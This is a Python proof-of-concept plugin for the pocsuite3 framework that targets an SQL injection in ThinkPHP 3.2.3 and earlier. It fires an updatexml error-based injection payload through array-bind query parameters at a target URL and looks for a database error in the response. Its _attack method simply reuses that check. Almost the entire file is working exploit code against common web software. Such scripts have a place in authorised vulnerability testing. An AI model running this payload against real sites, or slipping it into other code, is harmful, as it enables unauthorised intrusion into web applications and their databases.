from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout
from urllib.parse import urlparse, parse_qs
import requests

class Testpoc(POCBase):
	
	vulID = '1'
	name = 'thinkphp 3.2.3 UPDATE 注入'
	appName = 'Thinkphp'
	appVersion = '<= 3.2.3'
	desc = '该注入一般情况下存在用户更新的功能'

	def _verify(self):
			
			result = {}
			payload = r"1%20and%20updatexml(1,concat(0x7,(select%20watch_dog),0x7e),1)"
			url_parse = urlparse(self.url)
			match_string = "Unknown column 'watch_dog' in 'field list'"
			if url_parse.query:
					qs = parse_qs(url_parse.query)
					for i in qs:
							query_list = []
							query_list.append(i+'[]'+'='+'bind'+'&'+i+'[]'+'='+payload)
							for a in qs:
									if a == i:
											continue
									query_list.append(a+'='+qs[a][0])
							query = '&'.join(query_list)
							url = url_parse.scheme+'://'+url_parse.netloc+url_parse.path+url_parse.params+'?'+query

							try:
								req = requests.get(url)
								if match_string in req.text:
										print(req.text)
										print("success")
							except Exception as e:
								pass


						
	def _attack(self):
			return self._verify()
	

register_poc(Testpoc)
			

